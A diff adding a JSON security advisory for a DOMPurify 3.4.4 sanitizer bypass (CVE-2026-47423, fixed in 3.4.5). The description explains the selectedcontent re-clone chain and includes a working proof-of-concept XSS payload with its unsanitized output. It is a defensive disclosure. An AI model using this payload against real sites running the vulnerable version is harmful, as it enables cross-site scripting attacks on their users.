@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-01T14:07:29Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "dompurify"
+  },
+  "Advisory": {
+    "DatabaseId": 359950,
+    "Id": "GSA_kwCzR0hTQS04N3hnLXB4eDItN2h2eM4ABX4O",
+    "GhsaId": "GHSA-87xg-pxx2-7hvx",
+    "References": [
+      {
+        "Url": "https://github.com/cure53/DOMPurify/security/advisories/GHSA-87xg-pxx2-7hvx"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-87xg-pxx2-7hvx"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-87xg-pxx2-7hvx"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-47423"
+      }
+    ],
+    "Description": "### Summary\nDOMPurify 3.4.4 allows `selectedcontent` by default, allowing a chain in which browsers \"re-clone\" an XSS payload after sanitization, effectively bypassing DOMPurify. \n\n### Details\nThe chain is as follows:\n1. The browser parses the input and creates a `\u003cselectedcontent\u003e` clone from the selected `\u003coption\u003e`\n2. DOMPurify walks and sanitizes that generated clone.\n3. DOMPurify reaches the original `\u003coption\u003e` and removes `selected=javascript:1`\n4. The browser refreshes the `\u003cselectedcontent\u003e` clone from the original `option`'s content.\n5. The refreshed clone is in a subtree DOMPurify already walked, which DOMPurify doesn't go back to sanitize\n6. The returned string contains unsanitized markup inside `\u003cselectedcontent\u003e`.\n\n### PoC\n```js\nconst dirty =\n  '\u003cselect\u003e\u003cbutton\u003e\u003cselectedcontent\u003e\u003c/selectedcontent\u003e\u003c/button\u003e' +\n  '\u003coption selected=javascript:1\u003e' +\n  '\u003cimg src=x onerror=alert(1)\u003ex' +\n  '\u003c/option\u003e\u003c/select\u003e';\n\nconst clean = DOMPurify.sanitize(dirty);\nconsole.log(clean);\n\ndocument.body.innerHTML = clean;\n```\n\nObserved \"sanitized\" output in Chromium 148/WebKit 625:\n```html\n\u003cselect\u003e\u003cbutton\u003e\u003cselectedcontent\u003e\u003cimg src=\"x\" onerror=\"alert(1)\"\u003ex\u003c/selectedcontent\u003e\u003c/button\u003e\u003coption\u003e\u003cimg src=\"x\"\u003ex\u003c/option\u003e\u003c/select\u003e\n```\n\nAfter reinsertion, the browser updates the live DOM and strips the handler from the displayed clone, but the `onerror` has already fired:\n```html\n\u003cselect\u003e\u003cbutton\u003e\u003cselectedcontent\u003e\u003cimg src=\"x\"\u003ex\u003c/selectedcontent\u003e\u003c/button\u003e\u003coption\u003e\u003cimg src=\"x\"\u003ex\u003c/option\u003e\u003c/select\u003e\n```\n\nReproduced in Chromium and WebKit, but not Safari (not yet latest WebKit) or Firefox. Will likely change with [browser support](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/selectedcontent) for `selectedcontent`.\n\n### Impact\nThis is a default-configuration DOMPurify sanitizer bypass resulting in XSS.\n\nApplications are impacted if they sanitize attacker-controlled HTML with DOMPurify 3.4.4 using the string-input path and then insert the returned string into the page, for example with innerHTML.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-01T14:07:29Z",
+    "Severity": "HIGH",
+    "Summary": "DOMPurify XSS via selectedcontent re-clone",
+    "UpdatedAt": "2026-06-01T14:07:29Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.2,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.4.5"
+      },
+      "VulnerableVersionRange": "= 3.4.4"
+    }
+  ]
+}
